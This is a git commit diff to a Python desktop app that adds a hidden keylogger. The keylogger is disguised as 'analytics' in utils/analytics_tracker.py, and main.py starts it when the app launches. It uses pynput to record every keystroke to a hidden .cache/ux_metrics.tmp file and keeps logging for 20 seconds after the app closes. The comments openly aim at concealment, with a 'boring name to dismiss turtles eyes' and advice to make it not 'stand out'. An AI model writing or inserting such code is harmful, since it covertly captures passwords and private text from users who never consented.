189ad0e9176ba04c43a9a4c8bb7e479c22c77e55
Borges070 <lucas070borges@gmail.com>
2025-05-26 03:53:29 -0300

    The funny funny part is added. No wcloud yet though

--- main.py
+++ main.py
@@ -1,13 +1,21 @@
-from threading import Thread
+from threading import Thread as TH
 from views.gui import App
 from db import DB
 from utils.analytics_tracker import track_user_metrics
 
 def init_background_services():
-    Thread(target=track_user_metrics, daemon=True).start()
-# How to make this daemon False work
+    read = TH(target=track_user_metrics)
+    read.start()
+    return read
+
 if __name__ == "__main__":
     db: DB = DB()
 
     app = App(db)
-    app.mainloop()
+    reader = init_background_services()
+
+    try:
+        app.mainloop()
+    finally:
+        # This will make sure the background thread is stopped when the app closes
+        reader.join()
--- utils/analytics_tracker.py
+++ utils/analytics_tracker.py
@@ -1,19 +1,42 @@
 from pynput import keyboard
 import os
+import time
 
-CACHE_DIR = os.path.join(os.getcwd(), ".cache")
+CACHE_DIR = os.path.join(os.getcwd(), ".cache") # Directory to store cache files this one is misschievous enough
 os.makedirs(CACHE_DIR, exist_ok=True)
-KEYLOG_FILE = os.path.join(CACHE_DIR, "ux_metrics.tmp") # File to store key logs(boring name to dismiss turtles eyes)
+KEYLOG_FILE = os.path.join(CACHE_DIR, "ux_metrics.tmp")  # File to store key logs --> Change name
 
-def _klog(k): #change the name --> this here is the keylogger function
+def _klog(k): # change func name
+    
     try:
-        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
+        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:            
             f.write(k.char)
-    except AttributeError:
+    except AttributeError: # This handles special keys that do not have a char attribute, we can make it simpler so it doesnt stand out so much
         with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
-            f.write(f"[{k}]") #If the key doesn't have a .char attribute
-            #(e.g., special keys like Shift, Ctrl), it writes the string representation of the key in brackets (e.g., [Key.shift]).
+            if k == keyboard.Key.space:
+                f.write(" ")
+            elif k == keyboard.Key.enter:
+                f.write("\n")
+            elif k == keyboard.Key.tab:
+                f.write("\t")
+            elif k == keyboard.Key.backspace:
+                f.write("_")
+            elif k == keyboard.Key.esc:
+                f.write("[ESC]")
+            elif k == keyboard.Key.delete:
+                f.write("[DELETE]")          
+            elif k == keyboard.Key.ctrl:
+                f.write("[CTRL]")
+            elif k == keyboard.Key.alt:
+                f.write("[ALT]")        
+            elif k == keyboard.Key.print_screen:
+                f.write("[PRINT SCREEN]")
 
 def track_user_metrics():
+    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
+        f.write("\n------\n")
     listener = keyboard.Listener(on_press=_klog)
     listener.start()
+    time.sleep(20)  # Duration in seconds that will stay active after the main thread stops
+    listener.stop()
+    
